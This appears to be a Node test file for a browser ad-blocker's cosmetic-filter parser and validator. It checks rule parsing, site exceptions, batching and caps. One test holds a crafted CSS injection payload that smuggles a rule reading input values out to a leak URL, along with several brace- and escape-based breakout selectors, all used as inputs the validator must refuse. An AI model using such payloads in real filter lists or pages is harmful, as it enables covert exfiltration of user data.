"use strict";

const test = require("node:test");
const assert = require("node:assert/strict");
const C = require("./browser-adblock-cosmetic.cjs");

function index(lines, opts) {
  const idx = C.createCosmeticIndex(opts);
  for (const l of lines) idx.add(C.parseCosmetic(l));
  idx.freeze();
  return idx;
}

test("generic, site, exception and negated-site rules parse", () => {
  assert.deepEqual(C.parseCosmetic("##.ad_banner"), { exception: false, include: [], exclude: [], selector: ".ad_banner" });
  assert.deepEqual(C.parseCosmetic("shop.test,blog.test##.promo"),
    { exception: false, include: ["shop.test", "blog.test"], exclude: [], selector: ".promo" });
  assert.deepEqual(C.parseCosmetic("shop.test#@#.ad_banner"),
    { exception: true, include: ["shop.test"], exclude: [], selector: ".ad_banner" });
  assert.deepEqual(C.parseCosmetic("~shop.test##.sidebar-ad"),
    { exception: false, include: [], exclude: ["shop.test"], selector: ".sidebar-ad" });
  assert.equal(C.parseCosmetic("##a[href=\"#\"] > img").selector, "a[href=\"#\"] > img");
});

test("procedural rules, scriptlets, HTML filters and entity rules are skipped", () => {
  for (const line of ["site.test#?#div:-abp-has(.ad)", "site.test##div:has-text(Sponsored)", "##div:xpath(//x)",
    "site.test##+js(nowebrtc)", "site.test##^script:has-text(ad)", "site.test#$#log x", "google.*##.ad",
    "##.x:style(color: red)", "##div:upward(2)", "||ads.test^", "! ##.comment", ""]) {
    assert.equal(C.parseCosmetic(line), null, line);
  }
});

test("a selector that could leave its rule is refused", () => {
  for (const sel of [".a{display:block}", ".a}body{display:none", ".a;b", "@import url(x)", ".a/*", ".a\n.b",
    "a[href=\"x", "div:not(.a", "a[b", ".a)", ".a,.b", "</style>", `.${"x".repeat(400)}`, ".a\\"]) {
    assert.equal(C.safeSelector(sel), false, JSON.stringify(sel));
  }
  for (const sel of [".ad", "#ad-top", "div[class^=\"ad-\"]", "a[href*=\"x;y\"]", "div:not(.a, .b) > .c",
    "[style=\"width: 300px; height: 250px;\"]", ".a\\:b", "div:has(> .ad)"]) {
    assert.equal(C.safeSelector(sel), true, sel);
  }
});

// The validator and Chromium must read a selector the same way. Where they could
// disagree (a url( token ends at the first ")" whatever quotes it holds; a "(" inside
// "[" swallows the "]"), the selector is refused outright.
const INJECT = ":not(url(a\"b)){}body{background:rgb(255,0,0)!important}input[value^=\"s3\"]"
  + "{background:url(http://127.0.0.1:9/leak?v=s3)}:not(url(c\"d))";

test("a list line cannot smuggle a rule through a url( token or crossed brackets", () => {
  assert.equal(C.safeSelector(INJECT), false, "the url( desync");
  assert.equal(C.parseCosmetic(`##${INJECT}`), null);
  assert.equal(C.safeSelector("a[b(]c)"), false, "crossed brackets swallow the sheet");
  assert.equal(C.parseCosmetic("##a[b(]c)"), null);
  for (const sel of ["a:not(url(x))", "a:not(URL(x))", "a:not(u\\72l(x))", "a:not(\\75rl(x))", "a:not(\\55 rl(x))",
    "a:not(ur\\l(x))", "a:not(ur\\00006c(x))", "a[href*=\"url(\"]", "a(b[c)d]", "a[b]]", "a((b)",
    "a[href=\"{\"]", "a[href='}']", ".a\\{b", ".a\\}b"]) {
    assert.equal(C.safeSelector(sel), false, JSON.stringify(sel));
  }
  // Nothing of the payload reaches a sheet, and its neighbours still hide.
  const css = index(["##.ad_banner", `##${INJECT}`, "##a[b(]c)", "##.ad_two"]).cssFor("a.test");
  assert.equal(css, ".ad_banner,.ad_two{display:none!important}\n");
  assert.equal((css.match(/[{}]/g) || []).length, 2, "one rule, one pair of braces");
});

test("a page gets the generic rules plus its site's, minus its exceptions", () => {
  const idx = index(["##.ad_banner", "##.sponsored-ad", "shop.test##.promo", "shop.test#@#.ad_banner",
    "~blog.test##.sidebar-ad", "other.test##.only-other"]);
  const news = idx.selectorsFor("news.test");
  assert.deepEqual(news.generic.sort(), [".ad_banner", ".sidebar-ad", ".sponsored-ad"]);
  assert.deepEqual(news.specific, []);
  const shop = idx.selectorsFor("www.shop.test");
  assert.deepEqual(shop.generic.sort(), [".sidebar-ad", ".sponsored-ad"], "the exception removes .ad_banner on shop.test");
  assert.deepEqual(shop.specific, [".promo"], "a subdomain inherits the site's rules");
  assert.equal(idx.selectorsFor("blog.test").generic.includes(".sidebar-ad"), false, "~blog.test");
  assert.match(idx.cssFor("news.test"), /\.ad_banner/);
  assert.doesNotMatch(idx.cssFor("shop.test"), /\.ad_banner/);
  assert.match(idx.cssFor("shop.test"), /\.promo\{display:none!important\}/);
});

test("a bare #@# exception removes a generic rule everywhere", () => {
  const idx = index(["##.ad_banner", "##.keepme", "#@#.keepme"]);
  assert.deepEqual(idx.selectorsFor("a.test").generic, [".ad_banner"]);
});

test("selectors are grouped into small rules, so a bad one voids only its group", () => {
  const lines = [];
  for (let i = 0; i < 45; i += 1) lines.push(`##.ad-${i}`);
  const css = index(lines, { batch: 20 }).cssFor("a.test");
  const rules = css.trim().split("\n");
  assert.equal(rules.length, 3);
  for (const r of rules) assert.match(r, /^[^{}]+\{display:none!important\}$/);
  assert.equal(rules[0].split(",").length, 20);
  assert.equal(rules[2].split(",").length, 5);
});

test("the caps hold; a rule already kept is not refused when it comes again", () => {
  const lines = [];
  for (let i = 0; i < 50; i += 1) lines.push(`##.g-${i}`, `##.g-${i}`, `s${i}.test##.s-${i}`);
  const idx = C.createCosmeticIndex({ maxGeneric: 10, maxSpecific: 7 });
  for (const l of lines) idx.add(C.parseCosmetic(l));
  const stats = idx.freeze();
  assert.equal(stats.generic, 10);
  assert.equal(stats.specific, 7);
  assert.equal(stats.capped, 80 + 43, "every refused line is counted");
  assert.equal(idx.add(C.parseCosmetic("##.late")), false, "nothing is added after freeze");
});

test("the sheet for a host is built once and reused", () => {
  const idx = index(["##.ad_banner", "a.test##.x"]);
  assert.equal(idx.cssFor("a.test"), idx.cssFor("A.TEST"));
  assert.equal(idx.cssFor(""), ".ad_banner{display:none!important}\n");
});
